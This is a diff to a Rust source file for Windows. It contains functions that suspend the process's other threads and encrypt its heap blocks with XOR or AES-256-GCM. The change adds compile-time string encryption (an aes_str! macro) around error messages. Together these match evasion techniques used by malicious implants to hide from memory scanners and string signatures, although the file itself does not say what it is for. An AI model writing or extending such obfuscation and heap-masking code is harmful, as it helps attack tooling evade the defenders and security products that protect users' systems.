@@ -16,6 +16,10 @@
 // ── Thread Suspension ──────────────────────────────────────────────────
 
 #[cfg(target_os = "windows")]
+use crate::strcrypt_rt;
+#[cfg(target_os = "windows")]
+use strcrypt::aes_str;
+#[cfg(target_os = "windows")]
 pub fn suspend_other_threads() -> Vec<*mut std::ffi::c_void> {
     use std::ffi::c_void;
     use std::mem;
@@ -42,6 +46,7 @@ pub fn suspend_other_threads() -> Vec<*mut std::ffi::c_void> {
         _dw_flags:             u32,
     }
 
+    // OS-fixed (winnt.h) flags, not mirrored by the typed FFI config.
     const TH32CS_SNAPTHREAD:    u32 = 0x4;
     const THREAD_SUSPEND_RESUME:u32 = 0x0002;
 
@@ -125,6 +130,8 @@ struct ProcessHeapEntry {
     overhead:     u8,
     region_index: u8,
     flags:        u16,
+    // 24-byte Block/Region union - type-level size fixed by the winnt.h
+    // x64 ABI; must stay a literal so the layout pins in the tests below.
     _union:       [u8; 24],
 }
 
@@ -149,12 +156,13 @@ pub fn encrypt_heap(xor_key: &[u8; 16]) -> Result<usize, String> {
         fn HeapWalk(heap: *mut c_void, entry: *mut ProcessHeapEntry) -> i32;
     }
 
+    // OS-fixed (winnt.h) flag, not mirrored by the typed FFI config.
     const PROCESS_HEAP_ENTRY_BUSY: u16 = 0x4;
 
     unsafe {
         let heap = GetProcessHeap();
-        if heap.is_null() { return Err("GetProcessHeap failed".into()); }
-        if HeapLock(heap) == 0 { return Err("HeapLock failed".into()); }
+        if heap.is_null() { return Err(aes_str!("GetProcessHeap failed")); }
+        if HeapLock(heap) == 0 { return Err(aes_str!("HeapLock failed")); }
 
         let mut entry: ProcessHeapEntry = std::mem::zeroed();
         let mut encrypted_blocks = 0usize;
@@ -214,6 +222,7 @@ pub fn encrypt_heap_aes256gcm(key: &[u8; 32], base_nonce: &[u8; 12]) -> Result<u
         fn HeapWalk(heap: *mut c_void, entry: *mut ProcessHeapEntry) -> i32;
     }
 
+    // OS-fixed (winnt.h) flag, not mirrored by the typed FFI config.
     const PROCESS_HEAP_ENTRY_BUSY: u16 = 0x4;
 
     // Key schedule is stack-allocated (~240 bytes) - no heap alloc.
@@ -221,8 +230,8 @@ pub fn encrypt_heap_aes256gcm(key: &[u8; 32], base_nonce: &[u8; 12]) -> Result<u
 
     unsafe {
         let heap = GetProcessHeap();
-        if heap.is_null() { return Err("GetProcessHeap failed".into()); }
-        if HeapLock(heap) == 0 { return Err("HeapLock failed".into()); }
+        if heap.is_null() { return Err(aes_str!("GetProcessHeap failed")); }
+        if HeapLock(heap) == 0 { return Err(aes_str!("HeapLock failed")); }
 
         let mut entry: ProcessHeapEntry = std::mem::zeroed();
         let mut count: usize = 0;
